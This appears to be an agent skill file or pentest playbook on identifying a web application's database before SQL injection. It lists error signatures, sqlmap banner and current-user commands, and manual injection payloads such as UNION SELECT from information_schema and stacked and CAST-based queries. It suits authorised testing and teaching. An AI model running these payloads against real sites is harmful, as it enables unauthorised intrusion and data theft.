# Skill: DBMS Fingerprinting

## Metadata
- Phase: reconnaissance
- Techniques: N/A (pre-injection)
- DB Targets: all
- Risk Level: low
- Prerequisites: target URL, some response data

## When to Use

Use before running injection tests. Specifying `--dbms` in SQLMap reduces the number of requests by 5-10x by skipping tests for other databases. Even a rough guess (MySQL vs MSSQL) significantly speeds up the engagement.

## Detection Methods

### 1. Error Message Analysis

Common DB error signatures (visible in app responses):

| DB | Error Pattern |
|----|---------------|
| MySQL | `You have an error in your SQL syntax`, `mysql_fetch_array()`, `Warning: mysql_` |
| MSSQL | `Unclosed quotation mark after the character string`, `Microsoft OLE DB Provider`, `Incorrect syntax near` |
| PostgreSQL | `ERROR: unterminated quoted string`, `pg_query()`, `Warning: pg_` |
| Oracle | `ORA-00933: SQL command not properly ended`, `ORA-01756`, `oracle.jdbc` |
| SQLite | `SQLite3::`, `near "": syntax error` |
| DB2 | `CLI Driver`, `DB2 SQL error` |
| Sybase | `Sybase message`, `Warning: sybase_` |

Trigger errors deliberately:
```bash
curl "http://target.com/page.php?id='"
```

### 2. Technology Stack Clues

| Web Tech | Likely DBMS |
|----------|-------------|
| PHP + Apache/nginx | MySQL / MariaDB (most common) |
| ASP.NET + IIS | MSSQL / SQL Server |
| Java (Spring, JSP) | Oracle / PostgreSQL / MySQL |
| Python (Django) | PostgreSQL / MySQL / SQLite |
| Ruby on Rails | PostgreSQL / MySQL / SQLite |
| Node.js | MySQL / PostgreSQL / MongoDB |
| ColdFusion | MSSQL / Oracle |

### 3. HTTP Headers / Technology Fingerprinting

```bash
curl -I "http://target.com/"
```

| Header | Clue |
|--------|------|
| `Server: Microsoft-IIS` | Likely MSSQL |
| `X-Powered-By: ASP.NET` | Likely MSSQL |
| `X-Powered-By: PHP/7.x` | Likely MySQL |
| `Set-Cookie: JSESSIONID` | Java stack -> Oracle/PostgreSQL |
| `Set-Cookie: PHPSESSID` | PHP -> MySQL |
| `Set-Cookie: ASP.NET_SessionId` | MSSQL |

### 4. SQLMap Banner Grabbing

```bash
sqlmap -u "http://target.com/page.php?id=1" --banner --batch
```

### 5. Wappalyzer / BuiltWith

Browser extension or online tool to detect web technologies, which strongly imply the database backend.

## Minimum Viable Command

```bash
sqlmap -u "http://target.com/page.php?id=1" --banner --batch --level=1
```

## Recommended Full Command

```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --banner \
  --current-db \
  --current-user \
  --batch \
  --level=1 \
  --risk=1
```

## Expected Output
```
[INFO] fetching banner
[INFO] retrieved: '8.0.32-MySQL Community Server - GPL'
web server operating system: Linux Ubuntu
web application technology: PHP 7.4.3, Nginx
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
banner: '8.0.32-MySQL Community Server - GPL'
```

## Key DB-Specific Syntax Tests

Test manually by injecting known DB-specific syntax:

```sql
-- MySQL: GROUP_CONCAT exists
?id=1 AND 1=2 UNION SELECT GROUP_CONCAT(table_name),2 FROM information_schema.tables--

-- MSSQL: specific functions
?id=1; SELECT @@version--

-- PostgreSQL: specific casting
?id=1 AND 1=CAST(version() AS INT)--

-- Oracle: dual table
?id=1 UNION SELECT NULL FROM DUAL--
```

## Red Flags
- Cannot fingerprint DBMS from errors (app has custom error pages) -> Rely on tech stack clues
- Mixed indicators (e.g., IIS + PHP) -> Test both MSSQL and MySQL

## Follow-Up
- DBMS identified -> Add `--dbms=X` to all subsequent commands
- MySQL identified -> [MySQL Cheatsheet](../../docs/cheatsheets/mysql.md)
- MSSQL identified -> [MSSQL Cheatsheet](../../docs/cheatsheets/mssql.md)
- PostgreSQL identified -> [PostgreSQL Cheatsheet](../../docs/cheatsheets/postgresql.md)
